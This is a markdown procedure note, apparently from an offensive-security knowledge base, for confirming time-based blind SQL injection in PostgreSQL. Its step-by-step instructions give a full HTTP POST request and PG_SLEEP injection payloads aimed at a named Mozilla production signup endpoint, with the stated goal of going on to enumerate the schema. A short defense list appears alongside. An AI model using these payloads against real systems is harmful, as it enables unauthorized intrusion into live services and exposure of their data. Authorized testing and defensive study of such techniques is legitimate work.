---
id: proc-uuid-2
tags:
  - blind-sqli
  - time-based
  - postgresql
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands: []
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T03:15:05.201Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Time-Based-Blind-SQLi-Confirmation

## Summary

This procedure confirms SQL Injection vulnerabilities using time-based blind techniques, where payloads cause measurable delays in responses via database sleep functions, ideal for scenarios without visible error outputs.

## Description

Targeting the invite_code parameter in Mozilla's registration endpoint backed by PostgreSQL, this uses PG_SLEEP to inject delays, confirming injection without data return. It's effective for blind SQLi in production environments, requiring timing observation but no direct output, and builds on manual error testing.

## Requirements

1. Proxy for request modification and timing measurement
2. Knowledge of DBMS-specific functions (e.g., PG_SLEEP for PostgreSQL)
3. Patience for response timing (up to 20+ seconds per test)

## Defense

Defensive measures and detection strategies:

- Parameterize queries with prepared statements to prevent injection
- Implement request timeout monitoring to flag unusually long responses
- Rate-limit registration attempts to hinder timing attacks

## Objectives

1. Verify blind SQLi capability through response delays
2. Identify DBMS type via function success
3. Escalate to schema enumeration

## Instructions

### Step 1: Inject Basic Time Delay

**Context**: Craft a payload to close the SQL statement and introduce a 5-second sleep.

Send via proxy:

```bash
POST /interaction/KTTbkN8LaJgYIb7fIwPYX/signup HTTP/1.1
Host: prod.oidc-proxy.prod.webservices.mozgcp.net
Content-Type: application/x-www-form-urlencoded

invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(5))--
```

> Explanation: The subquery sleeps for 5s if injected successfully; measure total response time.

### Step 2: Increase Delay for Confirmation

**Context**: Use longer sleeps to rule out network variability.

```bash
# 10s delay:
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(10))--

# 20s delay:
invite_code=xxx');(SELECT 4564 FROM PG_SLEEP(20))--
```

> Expected: Delays matching sleep values, confirming control over query execution.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]] Initial Access

### Techniques

- [[Exploit Public-Facing Application]] Exploit Public-Facing Application

### Sub-Techniques

-

## Commands Used

-

## Tools Used

-

## Tags

- [[blind-sqli]]
- [[time-based]]
